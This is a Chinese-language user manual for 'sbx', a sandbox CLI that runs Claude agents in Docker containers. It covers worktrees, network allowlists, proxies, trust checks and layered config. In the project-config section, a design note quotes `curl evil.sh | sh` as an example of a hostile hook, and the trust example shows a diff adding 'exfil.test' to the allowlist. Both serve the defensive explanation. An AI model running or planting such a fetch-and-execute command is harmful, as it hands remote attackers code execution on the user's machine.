# sbx 命令手册

> 按"你会在什么时候用到它"递进排列：装一次 → 日常回路 → 会话控制 → 观察 → 网络 → 维护，最后是参数、配置和环境变量的速查。
> 不想要 worktree、想让改动直接落在仓库目录里，看[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。
> 还不知道 sbx 是什么、为什么这么设计，先看[项目主页](https://zzjha-cn.github.io/agent_sandbox/)；想看一个连续场景从头到尾发生了什么，去 [walkthrough.md](walkthrough.md)；想看组件怎么拼的，去 [architecture.md](architecture.md)。
> 本文描述 M1 + 部分 M2 的**实际代码行为**（`core/internal/cli/`），不是计划。

## 先有的三个概念

| 概念 | 是什么 | 从哪来 |
|---|---|---|
| **Workspace** | 一个 git 仓库。id = `<目录名>-<仓库根路径 sha1 前 6 位>`，例如 `shop-e76272` | `cd` 到仓库里任意位置自动识别 |
| **Task** | Workspace 下的一条工作线。一个 Task = 一个容器 + 一个 worktree + 一个分支 `sbx/<task>` | `sbx run <task>` |
| **main Task** | 省略 task 名时的特例：**直接用仓库根**，不建 worktree，没有专属分支 | `sbx run` |

**几乎所有命令都要在仓库目录里执行**（要靠 cwd 推断 Workspace）。只有 `sbx upgrade` 例外，它只读全局配置。

一句话记住路径：**Task 的改动在它自己的 worktree 里（`~/.sbx/worktrees/<ws>/<task>`），不在你的仓库目录里**，合并分支之后才回到仓库。想让改动直接落在仓库目录里，见[「我想直接在仓库目录里干活」](#我想直接在仓库目录里干活main-task)。

---

## 第 1 层：装一次

```bash
cd core && make build                       # 得到 bin/sbx
ln -sf "$PWD/bin/sbx" /usr/local/bin/sbx    # 可选，放进 PATH
```

需要 Docker Desktop 已启动，内存建议 10GB。

需要宿主机代理时写 `~/.sbx/config.toml`（全部字段见[下文](#配置文件sbxconfigtoml)）：

```toml
[network]
upstream = "http://host.docker.internal:7890"
```

**登录一次，所有 Task 共享。**

```bash
sbx login            # 打开 claude 的登录流程：照它给的链接授权，把授权码粘回来
sbx login --status   # 看看现在是哪个账号
```

命令形式是 `sbx login [claude|codex]`，**省略时就是 claude**。Codex 的登录流程（`codex login --device-auth`）还没验证，推迟到 M3-6；现在写 `sbx login codex` 会明确告诉你这件事，和打错名字的报错分开。

它在一个临时容器里挂上 `sbx-home` 跑 `claude auth login`，凭据落在这个 volume 里。**这个容器没有 Task，也就不接 Task 网络和 `sbx-proxy`**：配了 `network.upstream` 就走上游代理，否则直连。第一次 `sbx run` 发现没凭据时会停下来让你先跑这条。

`sbx done` 不会删 `sbx-home`（只删 `sbx.kind=dep` 的 Task 私有 volume）。OAuth token 过期后再跑一次 `sbx login`，写的是同一个 volume，所有 Task 立刻跟着生效。

| 参数 | 做什么 |
|---|---|
| `--status` | 只打印登录态，不登录 |
| `--logout` | 退出登录，清掉 `sbx-home` 里的凭据 |
| `--force` | 已经登录时也重新走一遍（换账号） |
| `--console` | 用 Anthropic Console 账号（按量计费）而不是 Claude 订阅 |
| `--email <addr>` | 预填登录页上的邮箱 |

`--console` 和 `--email` 是 claude 特有的，透传给 `claude auth login`。和 `sbx upgrade` 一样，**这条命令不需要在 git 仓库里执行**。

---

## 第 2 层：日常回路

四条命令就是一个完整的生命周期：

```bash
cd ~/code/shop
sbx run fix-login         # ① 开工：建 worktree + 分支 sbx/fix-login，起容器，进 claude
                          #    离开：Ctrl-b 松手再按 d
sbx ls                    # ② 看看它干得怎么样
sbx done fix-login        # ③ 收工：删容器/网络/dep volume/worktree/state，保留分支
git merge sbx/fix-login   # ④ 在主仓库里合并（sbx 不会自动合并）
git branch -D sbx/fix-login
```

### `sbx run [task]`

一条命令干三件事，**按容器是否存在自动分支**：

| 情况 | 行为 |
|---|---|
| 容器不存在 | 新建：worktree → 镜像 → 网络 → 接入 proxy → volume → 容器 → 起 claude。任何一步失败都会逆序清理（worktree 保留） |
| 容器存在但停了 | `docker start`，再确认 claude 在跑 |
| 容器在跑、claude 也在 | 什么都不做，直接 attach |
| 容器在跑、claude 退了（Ctrl-D / `/exit`） | **在原 tmux 会话里重新拉起**，默认带 `--continue` 接上上次对话 |

所以 `sbx run <同一个名字>` 是幂等的恢复命令，手滑退出 claude 之后再跑一次就回来了。

| 参数 | 说明 |
|---|---|
| `--base <ref>` | 新建分支的起点，默认当前 HEAD。Task 已存在时忽略并提示 |
| `-d, --detach` | 只启动不进入，适合批量铺任务 |
| `--fresh` | 重新拉起时开一段新对话（默认接上这个 Task 的上次对话） |
| `--net open\|allowlist` | 只影响本次，不写配置 |
| `--proxy shared\|dedicated` | 只影响本次，不写配置；Task 建好之后换不了（见下文） |
| `-p, --prompt <text>` | headless：跑完这段 prompt 就结束，不进会话（`-p -` 从 stdin 读） |

`--base` 用在从某个历史提交或另一分支起步：`sbx run hotfix --base v1.2.0`。分支已存在时，`ls` 里的 AHEAD/DIFF 基准自动取它和 HEAD 的分叉点（merge-base）。

### 无人值守：`sbx run -p` 和 `sbx logs`（M3-7）

```bash
sbx run nightly -p "把 CI 里失败的那几个测试修好，每修一个提交一次"
sbx run nightly -p - < prompt.md        # 长 prompt 从文件来
sbx run nightly -p "..." --detach       # 不等它，回头 sbx logs -f 看
sbx logs nightly                        # 看完整输出
sbx logs nightly -f -n 50               # 跟着看，先打最后 50 行
```

`-p` 和交互模式的区别只有两点：**不进 tmux**，以及**跑完容器自己停掉**。

- 前台跑时 sbx 跟着 `run.log` 打印直到结束，并用 claude 的退出码退出——所以 `sbx run t -p "..." && git merge sbx/t` 这种写法是成立的。
- **跑完容器会停**：整夜铺十个任务时，跑完一个就释放一份内存和一个 `max_running` 名额。想进去看现场就 `sbx run <task>` 把它起回来，worktree、分支、`run.log` 都还在。
- `sbx ls` 显示 `exited(0)`（或非 0 的码）。注意这是 **claude 的**退出码，不是容器的。
- 输出在 `~/.sbx/state/<ws>/<task>/run.log`，追加写，每轮前面有一行时间分隔头，超过 10MB 轮转成 `run.log.1`。`sbx logs` 读的就是这个文件，**所以容器停了照样看得到**。
- 默认接上这个 Task 的上次对话（和交互模式一样），`--fresh` 才新开一段。连续 `-p` 可以一轮一轮往下推。
- 它仍然跑在 tmux 里，所以**跑的过程中可以 `sbx attach` 进去围观**。
- 一个 Task 里已经有会话在跑时，`-p` 会被**直接拒绝**，不会插队——两个 claude 抢同一棵 worktree 只会互相踩。

### `sbx done <task>...`

可以一次给多个名字。**不会自动合并，分支一定保留**，结束后打印合并和删分支的命令。

两道防线：

- **未提交的改动** → 直接报错，让你先去提交；`--force` 才丢弃。
- **已提交未合并** → 分支和 commit 都在 `.git` 里，删 worktree 不影响。

删的是：容器、Task 网络、proxy 上的这个用户（dedicated 模式下是整个 sidecar 容器）、`sbx.kind=dep` 的依赖 volume、worktree、state 目录。**不删**：分支、`sbx-home`、`sbx-cache`、镜像。最后一个 shared Task 结束时顺带停掉 `sbx-proxy`。

同时会提醒一次项目记忆（见 `sbx memory pull`）——趁容器还在的时候读，所以提醒发生在删之前。

---

## 我想直接在仓库目录里干活（main Task）

默认的 `sbx run <task>` 会新开分支 `sbx/<task>` 和一个独立 worktree，改动**不在你的仓库目录里**。想让 Agent 直接改你 `cd` 进去的那个目录、宿主机 `git status` 立刻看得见 —— **省略 task 名**：

```bash
cd ~/code/shop
git switch -c try-refactor   # 建议先自己开一个分支（见下面的代价 ③）
sbx run                      # main Task：直接用仓库根
```

没有 `--no-worktree` 之类的开关，`main` 就是这个用法的全部入口。

| | `sbx run fix-login` | **`sbx run`（main）** |
|---|---|---|
| 工作目录 | `~/.sbx/worktrees/<ws>/fix-login` | **你的仓库根**（bind mount 进容器） |
| 分支 | 新建 `sbx/fix-login` | **不建，用你当前 checkout 的那个分支** |
| `--base` | 生效 | 忽略并提示 |
| `ls` 里的样子 | `sbx/fix-login` + AHEAD / DIFF | `(repo root)`，AHEAD / DIFF 都是 `-` |
| `done` 时 | 删 worktree | **仓库根一个字节不动**，只拆容器 |

### 代价

1. **你和 Agent 在同一棵工作树上。** 它 `git checkout`、`git stash`、改文件，你编辑器里那份跟着变。并行干活基本不可能 —— worktree 方案要解决的正是这个。
2. **一个 Workspace 只有一个 main。** 要同时跑两条线就必须用命名 Task。
3. **它直接提交到你当前分支。** 没有 `sbx/<task>` 这层隔离，不满意只能自己 reset，所以进去之前先开个分支。

> 容器里仍然会用 dep volume 遮住 `node_modules`（`deps.mask`），Agent 装的依赖不会污染你宿主机的那份 —— 这一条在 main 下也成立。

### 其实你未必需要它

worktree 就是宿主机上的真实目录，不是容器内部的东西：

```bash
code "$(sbx path fix-login)"    # 编辑器直接打开，和普通项目没区别
cd "$(sbx path fix-login)"      # git diff / git log 都正常
sbx ls                          # 不进目录也能看 AHEAD / DIFF
```

**怎么选**：要边看边改、随时介入一条线 → `sbx run`（main）。要并行铺几个任务、或者想保留"不满意就扔掉整个分支"的退路 → 命名 Task + `sbx path`。后者是 sbx 的主场景。

---

## 第 3 层：进出会话

```bash
sbx attach fix-login      # 回到 Agent 的 tmux 会话
sbx shell fix-login       # 在同一个容器里另开一个 bash（不打扰 Agent）
sbx stop fix-login        # 停容器，保留一切；sbx run 可恢复
```

三个都要求容器在运行，否则提示你去 `sbx run`。

**离开会话是 `Ctrl-b` 松手再按 `d`**（tmux detach），Agent 继续跑。`Ctrl-D` 是退出 claude 本身 —— 退出后 tmux 会话仍然活着（里面变成一个 shell，`ls` 显示 `exited(agent)`），`sbx run` 可以把它重新拉起来，所以手滑了不丢东西。

`attach` 到一个 claude 已退出的 Task 时会先提示你这件事，再把你放进那个 shell。

**`stop` 和 `done` 的区别**：`stop` 只是关机，容器、worktree、对话全在；`done` 是拆除。中途不干了用 `stop`，干完了用 `done`。

---

## 第 4 层：观察

```bash
sbx ls
sbx path fix-login
code "$(sbx path fix-login)"
cd "$(sbx path fix-login)"
```

`sbx ls` 列出当前 Workspace 的 Task（有容器的 + 有 state 目录的并集）：

| 列 | 含义 |
|---|---|
| `TASK` | Task 名 |
| `STATUS` | 见下表 |
| `BRANCH` | `sbx/<task>`，main Task 显示 `(repo root)` |
| `AHEAD` | 相对 base 的提交数。**`0` 意味着 Agent 还没提交过任何东西** |
| `DIFF` | `3f +10 -2` = 3 个文件、+10 行、-2 行（相对 base 的三点 diff） |
| `DENIED` | 这个 Task 被代理拦掉的请求数（只数"不在白名单"那一类）。`-` 表示这次没统计到（代理没在跑） |
| `LAST-ACTIVE` | hooks 最后一次写状态的时间 |
| `PATH` | worktree 路径（`~` 缩写） |

```bash
sbx ls --all          # 列出所有 Workspace 的 Task，多一列 WORKSPACE；不要求你在某个仓库里
sbx ls --no-denied    # 跳过 DENIED 列（它要读一次代理的 access.log）
```

STATUS 由容器状态和 claude hooks 写的 `status.json` 共同推导：

| 状态 | 含义 |
|---|---|
| `absent` | 没有容器（只剩 state） |
| `stopped` | 容器已停（含 `docker stop` 的 SIGTERM/SIGKILL） |
| `exited(<code>)` / `exited(oom)` | 容器异常退出；`oom` 说明内存不够，调 `resources.memory` |
| `starting` | 容器在跑，但还没收到第一个 hook |
| `running` | Agent 正在干活（`UserPromptSubmit` / `PreToolUse`） |
| `idle` | Agent 停下了：可能干完了，**也可能在等你回话**（`Notification`） |
| `exited(0)` | headless 跑完了（`sbx run -p`），这是 claude 的退出码 |
| `exited(agent)` | 容器还在，claude 退了，会话里是 shell。`sbx run` 可重新拉起 |

> **`idle` 是最需要你亲自看一眼的状态。** 它不区分"任务完成"和"Agent 在问你要不要继续"。配合 `AHEAD 0` 基本可以断定它停在要人确认上 —— attach 进去看最后一句话。

更细的时间线在 `~/.sbx/state/<ws>/<task>/events.log`，每行带日期和时区。

---

## 第 5 层：网络

**默认不拦截**（`network.mode = "open"`，2026-10-08 起）。两种模式都走 Squid（默认是共用的 `sbx-proxy`），所以日志一直有，云端 MCP 的策略拦截在两种模式下都生效。

```bash
sbx net denied                 # Agent 被代理拦了什么
sbx net denied fix-login       # 只看一个 Task
sbx net denied --since 2h      # 只看最近两小时
sbx net denied --all           # 连策略拦截、遥测、认证失败一起显示
sbx net allow repo.mongodb.org # 放行域名，写进 ~/.sbx/config.toml 并热加载
sbx run t1 --net allowlist     # 本次用白名单模式
sbx run t1 --proxy dedicated   # 本次用独占的代理 sidecar
```

`net denied` 默认只显示**"不在白名单"**这一类 —— 也就是真正可能挡住 Agent 干活的。另外两类折叠成一行计数（`--all` 展开）：

| 分类 | 说明 | 要不要管 |
|---|---|---|
| 不在白名单 | allowlist 模式下没放行的域名 | 要。看着像依赖源就 `net allow` |
| 策略拦截/遥测 | `mcp-proxy.anthropic.com`（ADR 0015）、datadog/statsig/sentry | 不用。拦掉是故意的，不影响干活 |
| 认证失败 | 代理鉴权没过 | 异常，说明 Task 的凭据或 proxy 片段有问题 |

`net allow` 会**直接改 TOML 文本而不是重新序列化**，所以你手写的注释和排版都保留；重复执行不动文件。改完立刻对当前 Workspace 里所有运行中的 Task 下发新名单并 `squid -k reconfigure`，不用重启容器。当前是 open 模式时它会提醒你"本来就不拦"。

内置白名单（`core/assets/allowlist/`，allowlist 模式下自动生效，不用你写）：`builtin.txt`（anthropic / claude.ai / openai）、`<profile>.txt`（web-go：npm、pypi、goproxy 等）。你在配置里写的 `network.allow` 是**追加**。域名以 `.` 开头表示连子域一起放行（Squid `dstdomain` 语义）。

> **选哪个模式**：默认 open 换来的是 Agent 能 web search、能装任意依赖，代价是 design §8.2 的"数据外传"缓解在默认配置下不生效。要跑不信任的代码或在意外传，就 `--net allowlist`。理由和放弃了什么，记在 ADR 0005 的 2026-10-08 修订里。

### 共用一个代理，还是一个 Task 一个（M2-7、design §6.2）

默认所有 Task 共用 `sbx-proxy`，靠代理认证区分谁是谁。`network.proxy = "dedicated"`（或 `sbx run <task> --proxy dedicated`）改成每个 Task 一个 sidecar：

|  | shared（默认） | dedicated |
|---|---|---|
| squid 实例 | 全局一个 `sbx-proxy` | `sbx-<ws>-<task>-proxy`，跟着 Task 生死 |
| 代理地址 | `http://<ws>.<task>:<token>@proxy:3128` | `http://proxy:3128`（没有认证） |
| 配置位置 | `~/.sbx/proxy/`，一个 Task 一个片段 | `~/.sbx/state/<ws>/<task>/proxy/`，整份独立 |
| 日志 | 共用 access.log，按用户名拆 | 自己一份，`net denied` 读法一样 |
| 多占的内存 | 一共 128m | **每个 Task 128m** |
| 什么时候用 | 日常 | 要排查代理本身、或者不想和别的 Task 共担故障（R8） |

不做认证是因为用不上：这个 sidecar 只接在这一个 Task 的 internal 网络上，除了它没人连得到。

**模式是建容器时定的**，记在 `state/<ws>/<task>/meta.json` 里。之后改配置不会把一个已经在跑的 Task 搬到另一种代理上——要换就 `sbx done` 之后重新 `run`。`sbx stop` 在 dedicated 下停掉这个 Task 自己的 sidecar，shared 下还是等最后一个 Task 停了才停 `sbx-proxy`。

`network.upstream` 两种模式都生效，但 shared 下只有一个上游（来自个人全局配置）。要给某个 Task 配不一样的上游，用 dedicated。

---

## 第 6 层：维护

```bash
sbx doctor            # 一次体检：docker、代理、登录、信任、通知、首次启动状态
sbx port t1 3000      # 把容器里的端口拿到 127.0.0.1 上
sbx drop t1           # 结束 Task 并删掉分支（要确认）
sbx memory pull       # 把沙箱里新记的项目记忆导回宿主机
sbx memory pull -y    # 不询问直接写
sbx upgrade           # 升级沙箱里的 claude
sbx login --status    # 现在登录的是哪个账号（详见第 1 层）
sbx config show       # 生效配置 + 每个值来自哪一层
sbx trust             # 确认这个仓库的 .sbx/ 内容（见下）
```

**记忆是单向自动的**：每次 `sbx run` 把宿主机这个仓库的记忆（`~/.claude/projects/<key>/memory/`）导入沙箱；沙箱里新记的**不会自动回来**，要 `memory pull`（ADR 0016）。它先按文件列出差异（`add` / `update` / `merge` / `conflict` / `keep`），确认后才写；两边都改过的标 `conflict`，不自动合，留给你手处理。`sbx done` 时会提醒一次。

**`sbx upgrade`** 在 Profile 镜像里 `npm view` 查最新版，重建 Agent 层，把版本号记在 `~/.sbx/claude-version`。容器里的 claude 不会自动更新，**已有 Task 仍用旧镜像**，`done` 之后重新 `run` 才换上。配置里固定了 `agents.claude.version` 时它会拒绝执行，让你改配置。这是唯一不需要在 git 仓库里执行的命令。

---

## 宿主机的哪些东西会进沙箱

容器里的 `~/.claude` 是 volume `sbx-home`，**和你宿主机的 `~/.claude` 是两套**。只有这张表上的内容会被带进去：

| 宿主机 | 进去的方式 |
|---|---|
| `~/.claude/CLAUDE.md` | 每次 `run` 快照复制到 `/sbx/gen/host-claude/`，软链到容器的 `~/.claude/CLAUDE.md` |
| `~/.claude/skills/` `agents/` `commands/` | 只读挂载到 `/sbx/host-claude/<name>`，软链进容器的 `~/.claude/` |
| `~/.claude/projects/<key>/memory/` | 每次 `run` 导入；回来要 `sbx memory pull`（ADR 0016） |
| git `user.name` / `user.email` | 读仓库配置，注入成 `GIT_AUTHOR_*` / `GIT_COMMITTER_*` |
| 时区 | 读 `/etc/localtime`，注入 `TZ` |

**不会进去的**：`~/.claude/settings.json`、`~/.claude/scripts/`、`plugins/`、MCP 配置、各种 API key。沙箱的 claude 配置是另外两层：

- `sbx-home` 里的 `~/.claude/settings.json`——preseed 建的（`theme`、`skipDangerousModePermissionPrompt`），**持久且所有 Task 共享**，你在容器里手改的东西留在这里；
- `/sbx/gen/settings.sbx.json`——每次 `run` 重新渲染，用 `--settings` 注入，放 hooks、`disableClaudeAiConnectors` 和状态栏。

**状态栏**是 sbx 内置的，不依赖你宿主机那份：脚本打包在 sbx 二进制里，渲染到 `/sbx/gen/statusline.sh`，显示 Task 名、模型、分支、未提交文件数和上下文占用条。要换成自己的，改 `core/assets/agent-layer/statusline.sh` 后 `make build`，下次 `run` 生效，**不用重建镜像**。

---

## 参数速查

### 全局

| 参数 | 说明 |
|---|---|
| `-v, --verbose` | 打印执行的每一条 docker 和 git 命令，外加本次生效配置。排查问题第一个加它 |

### 按命令

| 命令 | 参数 | 默认 |
|---|---|---|
| `run [task]` | `--base <ref>` | 当前 HEAD |
| | `-d, --detach` | false |
| | `--fresh` | false（接上次对话） |
| | `--net open\|allowlist` | 跟随配置 |
| | `--proxy shared\|dedicated` | 跟随配置 |
| | `--cloud-mcp` | false（云端 MCP 被拦；只能开不能关） |
| | `-p, --prompt <text>` | 空（交互模式）；`-` 读 stdin |
| `logs <task>` | `-f, --follow` | false |
| | `-n, --tail <行数>` | 0（全部），`-f` 时默认 20 |
| `ls` | `--all` | false（只看当前仓库） |
| | `--no-denied` | false |
| `drop <task>` | `--force` / `-y, --yes` | false |
| `port <task> [port]` | `--rm` | false（省略 port 时收回全部） |
| `doctor` | `--quick` | false（跳过慢的冒烟检查） |
| | `--strict` | false（警告也算失败） |
| `done <task>...` | `--force` | false（脏就报错） |
| `net denied [task]` | `--all` | false（只看"不在白名单"） |
| | `--since <dur>` | 0（全部），例如 `2h`、`30m` |
| `net allow <host>...` | `--project` | false（写个人全局；加上则写 `<repo>/.sbx/sandbox.toml`） |
| `memory pull` | `-y, --yes` | false（先问） |
| `login [claude\|codex]` | `--status` / `--logout` / `--force` | false |
| | `--console`（claude） | false（Claude 订阅） |
| | `--email <addr>`（claude） | 空 |
| `trust` | `--show` | false（展示并询问；加上则只看不写） |
| | `-y, --yes` | false（先问） |
| `config show` | 无 | |
| `attach/shell/stop/ls/path/upgrade` | 无 | |

---

## 用哪个镜像：Profile 和自定义（M3-1/2/3、design §5.2）

```toml
profile = "web-go"     # 内置：web-go（Go + Node + Python）| py-rust（uv + rustup）
# image = "ghcr.io/me/devbox:2026-10"   # 直接用现成镜像，覆盖 profile
```

优先级：**配置里的 `image` > `<repo>/.sbx/Dockerfile` > `profile`**。

- `<repo>/.sbx/Dockerfile` 存在就直接用它当底，不用写任何配置。它在 `.sbx/` 下，所以**信任确认天然管着它**——别人往里塞东西，你下次 `sbx run` 会看到 diff。
- 底层镜像必须是 **Debian/Ubuntu 系**（Agent 层要用 apt-get 和 useradd）。不是的话 sbx 会明确报错，而不是在构建中途以难懂的方式失败。
- **不需要自带 Node**：claude 是 npm 包，Agent 层发现底层没有 npm 会自己装。
- 装在 `/usr/local/<x>/bin` 里的工具记得软链到 `/usr/local/bin`：tmux 和 `bash -l` 是 login shell，`/etc/profile` 会重置 PATH。

**语言运行时按项目走（mise）**：worktree 里有 `.tool-versions`、`mise.toml`、`.nvmrc`、`.python-version`、`rust-toolchain.toml` 时，`sbx run` 会在容器里跑一次 `mise install`，装到全局共享的 `sbx-mise` volume 里——**第二个用同样版本的 Task 直接复用**（实测 51s → 2.8s）。装不上只警告，不挡住 Task 启动。

**依赖遮盖的默认值跟着 Profile 走**：web-go 是 `node_modules`、`.next`，py-rust 是 `.venv`、`target`。自己写 `deps.mask` 时是**追加**，不是替换。

---

## 把容器里的端口拿出来：`sbx port`（M3-11）

```bash
sbx port fix-login 3000     # → http://127.0.0.1:54321/
sbx port fix-login          # 列出这个 Task 映射过的端口
sbx port fix-login 3000 --rm
```

映射是**一个独立的 socat 转发容器**，不碰 Task 本身——重建 agent 容器会把正在跑的会话杀掉，这在无人值守时不可接受。所以端口随时可以来去，`sbx done` 时会连同它一起清掉。

**只绑 `127.0.0.1`**，宿主机端口由 docker 随机分配，所以多个 Task 开同一个端口也不会撞车。

---

## 连分支一起删：`sbx drop`（M3-12）

```bash
sbx drop spike      # 要求你输入 Task 名确认
sbx drop spike -y   # 脚本里用
```

`done` 做的事它全做，外加删掉 `sbx/<task>` 分支。确认提示会告诉你**有多少个提交会一起没掉**——容器和 worktree 都能重建，commit 删了就真没了，这是整套工具里唯一不可逆的操作。

---

## 配置：四层（ADR 0009、design §9.1）

```
内置默认值
  → ~/.sbx/config.toml                  个人全局
  → <repo>/.sbx/sandbox.toml            项目级，提交进仓库，队友共享
  → ~/.sbx/workspaces/<ws>.toml         你对这一个仓库的个人覆盖
```

**标量后者覆盖前者，列表取并集。** 后一条的代价要知道：列表项只能加不能减，想去掉内置默认的 `node_modules` 目前没有办法。

`<ws>` 是 `sbx ls` 第一行打印的 Workspace id（如 `shop-e76272`），不是目录名——同名仓库不会撞车。

### `sbx config show`

```console
$ sbx config show
默认      (内置)
全局      ~/.sbx/config.toml
项目      ~/code/shop/.sbx/sandbox.toml
工作区    ~/.sbx/workspaces/shop-e76272.toml  ← 没有这个文件

KEY                    VALUE                                     FROM
profile                "web-go"                                  项目
max_running            4                                         全局
network.mode           "allowlist"                               项目
network.allow          ["global.example.com", "api.internal"]    全局 + 项目
resources.memory       "6g"                                      工作区
```

**FROM 这一列是重点**：标量显示决定最终值的那一层，列表显示所有贡献者。排查"我明明改了为什么没生效"先跑它。不在 git 仓库里也能跑，那时只有前两层。

校验在**四层合并完之后**才做：被后面的层盖掉的非法值不报错；真报错时会告诉你这个值是哪一层给的。

### 项目层的三条红线（M2-2、M3-10）

`<repo>/.sbx/sandbox.toml` 跟着仓库走，clone 下来就生效，所以这一层里出现下面三类内容会**直接报错**，不是警告：

- **密钥类字段**：键名里含 `key`、`token`、`secret`、`password`、`credential`（`api_key_file` 这种"指明凭据从哪来"的也算）。
- **绝对路径**：值以 `/`、`~/` 或 `C:\` 开头。
- **会在容器里执行的命令**：键名形如 `on_*`、`*_cmd`、`*_command`、`*_script`、`*_hook`，比如 `on_idle`、`on_exit`。

这三类只能写在全局层或工作区层——也就是只能你自己写在自己机器上。检查对未知字段同样生效，不认识的键不能绕过去。

> 第三条是 M3-10 加的。`on_idle = "curl evil.sh | sh"` 既不像密钥也不是绝对路径，前两条红线都拦不住它；而信任确认虽然会把 `.sbx/` 的改动摊开给你看，但不该指望每个人每次都逐行读懂一段 shell。

未知字段只警告不报错。

### 信任确认：`sbx trust`（M2-3/4/5、design §9.3）

`.sbx/` 跟着仓库走。`git pull` 下来的一行改动就能换掉沙箱的白名单（将来还有自定义 Dockerfile），而你多半不会逐行看别人的 diff。所以 **`.sbx/` 的内容一变，`sbx run` 就先停下来**：

```
$ sbx run api
.sbx/ 和上次信任时相比有变化：

[修改] .sbx/sandbox.toml
--- 上次信任/sandbox.toml
+++ 现在/sandbox.toml
@@ -1,2 +1,2 @@
 [network]
-allow = ["api.example.com"]
+allow = ["api.example.com", "exfil.test"]
sbx: .sbx/ 自上次信任后变过。看过上面的改动后执行：sbx trust
```

```bash
sbx trust          # 展示改动（首次则展示全部内容），确认后记下
sbx trust --show   # 只看，什么都不写
sbx trust -y       # 不询问直接记下
```

几个要点：

- **没有 `.sbx/` 的仓库完全不受影响**，一行提示都不会多。
- 比对的是 `.sbx/` 下的**所有文件**，包括子目录和将来的 `.sbx/Dockerfile`；路径、大小、内容任一变化都算。
- **符号链接按链接本身记录，不跟随**。否则把 `.sbx/Dockerfile` 指到别处，换掉目标文件就能在哈希不变的情况下换掉实际内容。
- 快照里**存了文本文件的内容**（≤256KB），所以第二次变更能直接给你 diff，不用去翻 git 历史。二进制和超大文件只存哈希：变了会告诉你，但给不出 diff。
- 记录在 `~/.sbx/trust/<ws>.json`，**按 Workspace 分开**。同一份代码 clone 到两个目录是两个 Workspace，各自确认各自的。
- 只拦 `sbx run`。**已经在跑的 Task 不受影响**，`attach`、`shell`、`ls` 照常。
- `sbx net allow --project` 写完 `.sbx/sandbox.toml` 会顺手更新信任记录——这次改动是你让 sbx 做的。但**仅限写之前本来就是已信任状态**，否则会把别人留下的、你还没看过的改动一起放行。

```toml
profile       = "web-go"      # 内置 Profile：web-go | py-rust
# image       = "..."         # 直接用现成镜像，覆盖 profile（M3-2）
default_agent = "claude"
max_running   = 3             # 同时运行的 Task 上限，跨 Workspace 计数

[network]
upstream  = ""                # 宿主机代理，空=直连。只支持 http 上游
proxy     = "shared"          # shared（默认，全局一个 squid）| dedicated（每个 Task 一个 sidecar）
mode      = "open"            # open（默认，全放行）| allowlist（只放白名单）
cloud_mcp = false             # true 则不注入 disableClaudeAiConnectors，也不拦 mcp-proxy
allow     = []                # 追加到内置白名单，只在 allowlist 模式下起作用

[resources]
cpus   = 2
memory = "3g"                 # 形如 3g / 512m
pids   = 1024

# 通知（M3-10）：在容器里执行，只能写在全局层或工作区层
# on_idle = "curl -s https://hooks.example.com/idle?task=$SBX_TASK"
# on_exit = "curl -s https://hooks.example.com/exit?task=$SBX_TASK&code=$SBX_EXIT_CODE"
# notify_throttle = 600       # 两次同类通知的最小间隔（秒）

[deps]
mask = ["node_modules"]       # 每一项在容器里挂一个独立 volume 遮住，避免污染宿主机

[agents.claude]
version      = "latest"       # 写死版本会让 sbx upgrade 拒绝执行
# api_key_env  = "ANTHROPIC_API_KEY"   # 从宿主机环境变量读，优先于订阅登录
# api_key_file = "~/.keys/anthropic"   # 或者从文件读。两者只能二选一
```

**生效优先级**：命令行 flag（`--net`、`--proxy`）> 配置文件 > 内置默认值。这两个 flag 只改这一次执行，不落盘；`sbx net allow` 落盘。

**改了配置什么时候生效**：`network.allow` 对运行中的 Task 可以用 `net allow` 热加载；`resources`、`deps.mask`、`profile`、`network.proxy` 是建容器时定的，要 `done` 后重建；`mode` 和 `upstream` 下次 `run` 时重新渲染 proxy 配置。

## 用 API key 代替订阅登录（M2-13、design §7.1）

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
[agents.claude]
api_key_env = "ANTHROPIC_API_KEY"     # 从宿主机的这个环境变量读
# api_key_file = "~/.keys/anthropic"  # 或者从文件读；两者只能二选一
```

配上之后 `sbx run` 就不查订阅登录态了，key 在建容器时以 `ANTHROPIC_API_KEY` 注入容器：

```
$ sbx run api
用 API key 启动（来自环境变量 ANTHROPIC_API_KEY），不走订阅登录
```

几个要点：

- **配了但取不到值会直接报错**（环境变量没设、文件不存在或为空），不会静默退回订阅登录——否则你以为在用 API key，账单却记到订阅账号上。
- **这两个键只能写在全局层或工作区层。** 项目层的红线（M2-2）会拦住它们，键名里有 `key` 就不行。
- **key 会留在容器的 `Config.Env` 里**，`docker inspect` 看得到。这是环境变量注入的固有代价，design §7.1 选的就是这条路。
- **环境变量只能在建容器时注入。** 已经建好的 Task 不会因为你改了配置就拿到 key；`sbx run` 会检测到并明确告诉你要 `sbx done` 之后重建，而不是让 claude 自己报一个莫名其妙的认证错误。
- claude 看到环境里有自定义 key 时会弹一个 “Detected a custom API key … Do you want to use this API key?” 并**默认停在 No** 上，无人值守会卡死。sbx 在 preseed 阶段把 key 的后 20 个字符写进 `~/.claude.json` 的 `customApiKeyResponses.approved`，把这个框按掉（M2-13 实测）。

---

## 云端 MCP（M2-10a、ADR 0015）

默认**不**让 Task 连 Claude 的云端连接器：代理拦 `mcp-proxy.anthropic.com`，同时在注入的 settings 里写 `disableClaudeAiConnectors: true`（不从源头关掉的话 claude 会反复重试，实测一分钟撞出三百多次 403，R11）。

要用就打开：

```bash
sbx run api --cloud-mcp          # 只这一次
```

```toml
[network]
cloud_mcp = true                 # 一直打开
```

`--cloud-mcp` 只能打开不能关——关是默认值，不加就是关。

---

## 跑完告诉我一声：`on_idle` / `on_exit`（M3-10、design §7.2）

```toml
# ~/.sbx/config.toml 或 ~/.sbx/workspaces/<ws>.toml —— 不能写在项目层
on_idle = "curl -s -X POST https://open.feishu.cn/open-apis/bot/v2/hook/xxx --data-raw \"{\\\"msg_type\\\":\\\"text\\\",\\\"content\\\":{\\\"text\\\":\\\"$SBX_TASK 停下来了\\\"}}\""
on_exit = "curl -s -X POST https://.../hook -d \"task=$SBX_TASK&code=$SBX_EXIT_CODE\""
notify_throttle = 600   # 两次同类通知的最小间隔（秒），默认 600
```

命令**在容器里执行**，sbx 没有宿主机守护进程，也不内置任何系统通知。

| 挂在哪 | 什么时候 |
|---|---|
| `on_idle` | `Notification` 事件：Agent 空闲约 60 秒，通常意味着它在等你回话。**不挂 Stop**——短暂停顿也发通知会很吵 |
| `on_exit` | claude 退出时（`SessionEnd`）。headless 下由包装脚本在容器停掉之前同步发，所以拿得到退出码 |

